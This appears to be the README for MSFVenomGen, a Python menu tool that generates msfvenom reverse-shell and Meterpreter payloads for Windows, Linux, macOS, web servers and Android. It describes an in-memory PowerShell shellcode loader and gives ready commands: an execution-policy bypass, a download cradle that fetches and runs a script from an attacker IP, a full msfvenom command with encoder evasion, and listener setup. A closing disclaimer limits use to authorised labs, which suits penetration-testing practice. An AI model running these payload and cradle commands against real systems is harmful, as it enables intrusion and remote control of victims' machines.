# MSFVenomGen

Interactive `msfvenom` payload generator. Automatically detects your VPN IP from `tun0` and walks you through target OS, payload type, output format, and listener setup via a numbered terminal menu.

## Requirements

- Python 3.10+
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework) (`msfvenom` / `msfconsole` in `$PATH`)
- `nc` (netcat) — optional, for the netcat listener
- Linux (uses `ioctl` for tun0 detection)

## Usage

```bash
python3 msfvenomgen.py
```

Or make it executable and run directly:

```bash
chmod +x msfvenomgen.py
./msfvenomgen.py
```

## Menu flow

Each step presents a numbered list. Enter `0` at any point to go back or quit.

```
1. Target OS       — Windows / Linux / macOS / Web / Android
2. Category        — Reverse Shell / Meterpreter / Web Payload
3. Payload         — staged, stageless, x86/x64, TCP/HTTP/HTTPS variants
4. Format          — exe, elf, apk, php, jsp, war, asp, ps1, dll, raw, ...
5. PS1 mode        — (ps1 only) wrapped executable loader or raw byte array
6. LHOST / LPORT   — pre-filled from tun0; edit as needed (default port: 4444)
7. Output filename — suggested default based on format (e.g. payload.exe)
8. Extra options   — free-form field for encoders, iterations, etc.
9. Confirmation    — shows the exact msfvenom command before running
10. Listener       — optionally start nc or msfconsole multi/handler
```

## Supported payloads

| OS      | Categories                    | Formats                          |
|---------|-------------------------------|----------------------------------|
| Windows | Reverse Shell, Meterpreter    | exe, dll, ps1, hta, msi          |
| Linux   | Reverse Shell, Meterpreter    | elf, elf-so, raw                 |
| macOS   | Reverse Shell, Meterpreter    | macho, raw                       |
| Web     | Web Payload                   | php, jsp, war, asp, aspx         |
| Android | Meterpreter                   | apk, raw                         |

### Payload variants (per OS where applicable)

- TCP staged / stageless
- TCP x64 staged / stageless
- HTTP / HTTPS staged
- HTTP / HTTPS x64 staged
- PHP reverse shell / PHP Meterpreter
- JSP / WAR / ASP / ASPX reverse shells
- Android TCP / HTTPS stageless

## PowerShell output modes

When `ps1` is selected as the format, an additional menu asks how to package the payload:

| Mode | Description |
|------|-------------|
| **Wrapped loader** | Produces a complete, executable `.ps1` script with an inline shellcode runner |
| **Raw bytes** | Produces the raw `msfvenom -f ps1` byte array output with no wrapper |

### Wrapped loader

`msfvenom` is invoked with `-f raw` to produce a plain shellcode byte blob. The script then base64-encodes those bytes and writes a complete `.ps1` loader that:

1. Decodes the base64 shellcode back to a `byte[]`
2. Calls `VirtualAlloc` (RWX) via P/Invoke to allocate executable memory
3. Copies the shellcode into that region with `Marshal.Copy`
4. Spawns a new thread pointing at the shellcode with `CreateThread`
5. Waits indefinitely for the thread with `WaitForSingleObject`

The intermediate raw shellcode file is deleted automatically once the wrapper is written.

Execute on the target with:

```powershell
powershell -ExecutionPolicy Bypass -File payload.ps1
```

Or as a download cradle (serve the file over HTTP first):

```powershell
powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/payload.ps1')"
```

### Raw bytes

`msfvenom` is invoked with `-f ps1` directly, producing its native output — a `$buf` variable containing a raw byte array. Use this when you want to embed the shellcode manually into your own PowerShell script or framework.

## tun0 detection

The script reads the IP address of the `tun0` interface directly via `ioctl` (no shell subprocesses). If `tun0` is not up when the script starts, a warning is shown and you can enter `LHOST` manually.

## Listener options

After a payload is generated you are offered:

| Option | Command run |
|--------|-------------|
| netcat | `nc -lvnp <LPORT>` |
| Metasploit multi/handler | `msfconsole -q -r <rc file>` with `ExitOnSession false` and `-j` (background jobs) |
| Skip | Return to the main menu |

## Example

```
[1] Windows
[2] Linux
[3] macOS
[4] Web
[5] Android
[0] Back / Quit

> 1

[1] Reverse Shell
[2] Meterpreter
[0] Back / Quit

> 2

[1] TCP (staged)
[2] TCP (stageless)
[3] TCP x64 (staged)
...

> 3

[1] exe
[2] dll
[3] ps1
...

> 1

  LHOST [10.10.14.23]:
  LPORT [4444]: 9001
  Output filename [payload.exe]: shell.exe
  Extra msfvenom options: -e x86/shikata_ga_nai -i 3

  Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=9001 -f exe -o shell.exe -e x86/shikata_ga_nai -i 3

  Generate payload? [y/N]: y
```

## License

[MIT](LICENSE) — Copyright (c) 2026 skotch

## Disclaimer

This tool is intended for use on machines you own or have explicit permission to test, such as those on HackTheBox, TryHackMe, or your own lab environment. Unauthorised use against systems you do not have permission to access is illegal.
